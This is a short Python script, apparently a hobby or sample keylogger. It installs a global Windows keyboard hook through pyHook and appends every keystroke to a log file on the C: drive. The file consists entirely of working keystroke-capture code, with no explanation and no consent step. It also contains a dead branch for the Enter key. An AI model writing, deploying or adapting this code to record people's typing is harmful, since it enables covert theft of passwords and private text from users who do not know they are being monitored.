import sys
import os
import pyHook
import pythoncom


class Logger:

    def __init__(self, file_name):
        self.file = file_name

    def write_to_file(self, text):
        with open(self.file, "w") as wFile:
            wFile.write(text)

    def append_to_file(self, text):
        with open(self.file, "a") as aFile:
            aFile.write(text)

    def read_from_file(self):
        with open(self.file, 'r') as rFile:
            read_file = rFile.read()
            for line in read_file:
                print(line)


log = Logger("C:\\Logs\\Logs.txt")


# Logging of each character as its corresponding Acsii format.
def on_press(event):
    if event.Ascii:
        char = chr(event.Ascii)
        log.append_to_file(char)
    elif event.Ascii == 13:
        char = chr(event.Ascii)
        log.append_to_file("\n")
        log.append_to_file(char)
    return True


proc = pyHook.HookManager()
proc.KeyDown = on_press
proc.HookKeyboard()
pythoncom.PumpMessages()
log.read_from_file()


